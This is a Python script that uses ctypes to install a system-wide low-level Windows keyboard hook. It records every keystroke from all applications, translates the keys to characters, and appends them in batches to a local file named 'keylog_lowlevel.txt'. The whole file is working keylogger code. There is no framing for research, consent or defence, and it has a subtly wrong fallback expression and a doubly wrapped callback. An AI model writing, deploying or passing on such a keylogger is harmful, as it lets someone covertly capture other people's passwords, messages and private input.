import ctypes
from ctypes import wintypes
import sys
from datetime import datetime

from ctypes import wintypes

user32 = ctypes.windll.user32

user32.CallNextHookEx.argtypes = (
    wintypes.HHOOK,   # hhk
    ctypes.c_int,     # nCode
    wintypes.WPARAM,  # wParam
    wintypes.LPARAM   # lParam
)

user32.CallNextHookEx.restype = wintypes.LPARAM



# Win32 Constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
LLKHF_EXTENDED = 0x01  


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),  

    ]

# Globals
buffer = []
log_file = 'keylog_lowlevel.txt'
hHook = None
callback = None  

special_keys = {
    0x08: '[BACKSPACE]',
    0x0D: '[ENTER]',
    0x20: ' ',
    0x09: '[TAB]',
}

def log_batch():
    if buffer:
        # ts = datetime.now().strftime("%H:%M:%S")
        batch_str = ''.join(buffer)
        log_entry = f"BATCH: {batch_str}"
        with open(log_file, "a", encoding='utf-8') as f:  # UTF-8 for symbols
            f.write(log_entry + "\n")
        buffer.clear()


def vk_to_chars(vk_code, scan_code, flags):
    """Convert VK to 1-4 chars using Windows layout (handles shift, dead keys)."""
    chars = []
    hkl = ctypes.windll.user32.GetKeyboardLayout(0)  
    state = (ctypes.c_ubyte * 256)()  
    if flags & LLKHF_EXTENDED:
        state[0x10] = 0x80 
    n_chars = ctypes.c_int(0)
    buf = (ctypes.c_wchar * 4)()  
    ctypes.windll.user32.ToUnicodeEx(vk_code, scan_code, state, buf, 4, 0, hkl)
    for i in range(4):
        if buf[i]:
            chars.append(buf[i])
        else:
            break
    return ''.join(chars) or chr(vk_code) if 32 <= vk_code <= 126 else ''  # Fallback

LowLevelKeyboardProc = ctypes.CFUNCTYPE(
    ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM
)

@LowLevelKeyboardProc
def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam == WM_KEYDOWN:
       
        kstruct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kstruct.vkCode
        scan_code = kstruct.scanCode
        flags = kstruct.flags

        to_append = ''
        if vk_code in special_keys:
            to_append = special_keys[vk_code]
        else:
            to_append = vk_to_chars(vk_code, scan_code, flags)  

        if to_append:
            buffer.append(to_append)
            if len(buffer) >= 100:  
                log_batch()

    return ctypes.windll.user32.CallNextHookEx(hHook, nCode, wParam, lParam)  

def start_hook():
    global hHook, callback
    callback = LowLevelKeyboardProc(low_level_keyboard_proc)
    hHook = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback, None, 0)  
    if not hHook:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed hook (err {error_code})")
    print(f"Hook installed (handle: {hHook}).")

def stop_hook():
    global hHook
    log_batch()  
    if hHook:
        ctypes.windll.user32.UnhookWindowsHookEx(hHook)
        hHook = None
    print(f"Unhooked. Check {log_file}")

if __name__ == "__main__":
    try:
        start_hook()
        msg = wintypes.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:  
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))  
    except KeyboardInterrupt:
        print("\nStopping...")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        stop_hook()